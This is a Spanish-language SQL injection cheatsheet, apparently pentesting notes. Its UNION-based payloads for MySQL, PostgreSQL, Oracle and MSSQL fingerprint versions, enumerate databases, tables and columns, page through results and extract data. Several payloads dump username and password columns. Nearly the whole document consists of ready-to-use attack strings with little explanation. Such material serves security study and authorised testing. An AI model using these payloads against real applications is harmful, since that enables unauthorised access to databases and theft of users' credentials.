
---
# Cheatsheet de SQLi en Bases de Datos Comunes

En este documento recogemos las principales consultas de enumeración y extracción de información mediante **inyecciones SQL (SQLi)** en las bases de datos más habituales: [MySQL](MySQL.md), [PostgreSQL](.md), [Oracle](Oracle.md) y [MSSQL](MSSQL.md) (Microsoft SQL Server ).  

---

# MySQL

## Obtener versión
```sql
' UNION SELECT NULL, @@version -- 
```

## Listar bases de datos
```sql
' UNION SELECT NULL, schema_name FROM information_schema.schemata -- 
```

## Listar tablas
```sql
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'nombre_base_datos' -- 
```

## Listar columnas
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla' AND table_schema = 'nombre_base_datos' -- 
```

## Extraer datos
```sql
' UNION SELECT username, password FROM users -- 
```

## Paginación
```sql
' UNION SELECT NULL, col FROM tabla LIMIT 10 OFFSET 0 -- 
```

---

# PostgreSQL

## Obtener versión
```sql
' UNION SELECT NULL, version() -- 
```

## Listar bases de datos
```sql
' UNION SELECT datname, NULL FROM pg_database -- 
```

## Listar schemas en la base de datos actual
```sql
' UNION SELECT NULL, schema_name FROM information_schema.schemata -- 
```

## Listar tablas de un esquema
```sql
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' -- 
```

## Listar columnas
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla' -- 
```

## Extraer datos
```sql
' UNION SELECT username, password FROM users -- 
```

## Paginación
```sql
' UNION SELECT NULL, col FROM tabla LIMIT 10 OFFSET 0 -- 
```

---

# Oracle

## Obtener versión
```sql
' UNION SELECT NULL, banner FROM v$version WHERE ROWNUM = 1 -- 
```

## Listar schemas (usuarios)
```sql
' UNION SELECT NULL, username FROM all_users -- 
```

## Listar tablas
```sql
' UNION SELECT NULL, table_name FROM all_tables WHERE owner = 'ESQUEMA' -- 
```

## Listar columnas
```sql
' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'NOMBRE_TABLA_EN_MAYUSC' -- 
```

## Extraer datos
```sql
' UNION SELECT NULL, USER FROM DUAL -- 
```

## Paginación (con ROWNUM)
```sql
' UNION SELECT NULL, col FROM (SELECT col, ROWNUM rn FROM tabla WHERE ROWNUM <= 20) WHERE rn > 10 -- 
```

---

# Microsoft SQL Server (MSSQL)

## Obtener versión
```sql
' UNION SELECT NULL, @@version -- 
```

## Listar bases de datos
```sql
' UNION SELECT name, NULL FROM sys.databases -- 
```

## Listar tablas
```sql
' UNION SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'dbo' -- 
```

## Listar columnas
```sql
' UNION SELECT NULL, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'PRODUCT' AND TABLE_SCHEMA = 'dbo' -- 
```

## Extraer datos
```sql
' UNION SELECT username, password FROM nombre_tabla -- 
```

## Paginación
```sql
' UNION SELECT TOP 10 NULL, col FROM tabla -- 
' UNION SELECT NULL, col FROM tabla ORDER BY id OFFSET 10 ROWS FETCH NEXT 10 ROWS ONLY -- 
```

---

## Versiones

- **MySQL** → usa `LIMIT` para paginación.  
- **PostgreSQL** → muy similar a MySQL (`LIMIT ... OFFSET`).  
- **Oracle** → usa `ROWNUM` o subconsultas para limitar resultados.  
- **MSSQL** → versiones antiguas usan `TOP`; versiones modernas permiten `OFFSET ... FETCH`.  

---

